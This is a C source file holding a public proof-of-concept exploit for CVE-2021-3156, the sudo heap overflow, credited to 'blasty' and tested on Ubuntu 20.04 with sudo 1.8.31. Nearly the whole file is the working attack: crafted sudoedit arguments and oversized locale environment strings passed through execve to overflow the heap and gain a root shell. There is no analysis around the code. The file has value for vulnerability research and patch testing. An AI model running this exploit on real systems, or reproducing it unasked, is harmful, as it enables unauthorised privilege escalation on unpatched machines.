//
// CVE-2021-3156 PoC by blasty <peter@haxx.in>
// ===========================================
//
// Tested on:
// Ubunutu 20.0.4.1 LTS
// Sudo version 1.8.31
// Sudoers policy plugin version 1.8.31
// Sudoers file grammar version 46
// Sudoers I/O plugin version 1.8.31
// 
// shout out to Qualys for pumping out awesome bugs
// shout out to lockedbyte for coop hax. (shared tmux gdb sessions ftw)
// shout out to dsc for giving me extra cpu cycles to burn.
//
// Enjoy!
//
//   -- blasty // 20213001

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <ctype.h>

#define SUDOEDIT_PATH "/usr/bin/sudoedit"

int main(int argc, char *argv[]) {
	// CTF quality exploit below.
	char *s_argv[]={
		"sudoedit",
		"-u", "root", "-s",
		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\",
		"\\",
		"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB123456\\",
		NULL
	};

	char *s_envp[]={
		"\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
		"\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
		"\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
		"\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
		"\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
		"\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
		"\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\",
		"\\", "\\", "\\", "\\", "\\", "\\", "\\",  
		"X/P0P_SH3LLZ_", "\\",
		"LC_MESSAGES=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
		"LC_ALL=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
		"LC_CTYPE=C.UTF-8@AAAAAAAAAAAAAA",
		NULL
	};

	printf("**** CVE-2021-3156 PoC by blasty <peter@haxx.in>\n");

	execve(SUDOEDIT_PATH, s_argv, s_envp);

	return 0;
}
